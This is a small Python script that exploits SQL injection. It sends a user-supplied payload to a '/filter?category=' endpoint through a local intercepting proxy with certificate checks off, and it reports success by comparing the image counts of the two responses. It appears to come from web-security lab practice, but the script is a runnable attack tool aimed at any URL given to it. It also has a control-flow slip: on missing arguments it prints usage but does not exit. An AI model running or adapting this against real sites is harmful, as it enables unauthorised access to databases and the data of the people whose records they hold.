import requests 
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080' }

def exploit_SQLi(url, sqli_payload):
    uri = '/filter?category='

    r1 = requests.get(url + uri + 'Pets', verify=False, proxies=proxies)
    normal_count = r1.text.count('<img') 

    r2 = requests.get(url + uri + sqli_payload, verify=False, proxies=proxies)
    injected_count = r2.text.count('<img')  
    
    if injected_count > normal_count:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('Usage : python SQLi.py <url><SQLi_Payload>')
        print('Example : python SQLi.py example.com 1=1\'')


if exploit_SQLi(url, sqli_payload) :
    print('[+] SQL injection is successful !')
else:
    print('[-] SQL injection is unsuccessful !')